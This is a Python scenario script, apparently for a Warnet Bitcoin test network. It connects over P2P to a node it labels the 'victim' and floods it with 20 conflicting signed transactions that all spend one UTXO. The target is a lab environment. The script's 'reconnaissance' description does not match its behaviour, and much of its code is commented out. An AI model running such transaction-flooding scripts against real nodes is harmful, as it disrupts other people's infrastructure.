#!/usr/bin/env python3

import socket
import time
from commander import Commander

from test_framework.messages import (
    MSG_TX,
    CInv,
    hash256,
    tx_from_hex,
    msg_tx,
    COIN,
    CTxIn,
    COutPoint,
    CTxOut,
    CTransaction,
)
from test_framework.p2p import MAGIC_BYTES, P2PInterface
from test_framework.script import CScript, OP_CAT
from test_framework.address import script_to_p2sh, address_to_scriptpubkey


def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


class SpendingCoins(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate network reconnaissance using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/reconnaissance.py"

    # Scenario entrypoint
    def run_test(self):
        node = self.nodes[0]
        victim = "tank-0036-coffee.default.svc"

        addr = socket.gethostbyname(victim)
        # node.addnode(f"{addr}:38333", "onetry")
        MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        self.log.info("Connecting to victim")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=addr, dstport=38333, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        utxos = node.listunspent()

#        for i, u in enumerate(utxos):
#            a = u["amount"]
#            self.log.info(f"i {i} a {a} {a * COIN}")

        txid = int(utxos[5]["txid"], 16)
        vout = utxos[5]["vout"]
        amount = utxos[5]["amount"]
        t = int(amount * COIN)
        self.log.info(f"amount {amount} {t}")

#        self.log.info(f"utxos {utxos}")

#        sec_tx = CTransaction()
#        sec_tx.vin.append(CTxIn(COutPoint(txid, vout)))
#        sec_tx.vout.append(
#            CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
#        )

        # raw_tx = node.create_raw_transaction(sec_tx.serialize())
#        signed_tx = node.signrawtransactionwithwallet(sec_tx.serialize().hex())

#        self.log.info(f"signed_tx {signed_tx}")

#        tx = tx_from_hex(signed_tx["hex"])
#        attacker.send_and_ping(msg_tx(tx))

#        out_count = int(t / 1000)
        out_count = int(5)
        v = int(amount * COIN/out_count)
        self.log.info(f"out_count {out_count} v {v}")
        tran_list = []        
        for i in range(0,20):
            sec_tx2 = CTransaction()
            sec_tx2.vin.append(CTxIn(COutPoint(txid, vout)))
            total = int(0)
            for j in range(0,out_count-1):
#                a = amount/out_count
#                v = int(a * COIN)
                total += v
#                self.log.info(f"{j} {v} total {total}")
                sec_tx2.vout.append(
                    CTxOut(v, address_to_scriptpubkey(node.getnewaddress()))
                )
            if total < t:
                v = t - total
                total += v
                self.log.info(f"{v} total {total}")
                sec_tx2.vout.append(
                    CTxOut(v, address_to_scriptpubkey(node.getnewaddress()))
                )
            signed_tx2 = node.signrawtransactionwithwallet(sec_tx2.serialize().hex())

            self.log.info(f"{i} signed_tx2 {signed_tx2}")

            tx2 = tx_from_hex(signed_tx2["hex"])
            self.log.info(f"{i} tx2.get_weight {tx2.get_weight()}")
            tran_list.append(tx2)
#            attacker.send_and_ping(msg_tx(tx2))

        wallet = self.ensure_miner(node)
        for address_type in ["legacy", "p2sh-segwit", "bech32", "bech32m"]:
            self.addrs.append(wallet.getnewaddress(address_type=address_type))

        for i, t in enumerate(tran_list):
            self.log.info(f"sending {i}")
            attacker.send_and_ping(msg_tx(t))
            time.sleep(1)

def main():
    SpendingCoins().main()


if __name__ == "__main__":
    main()
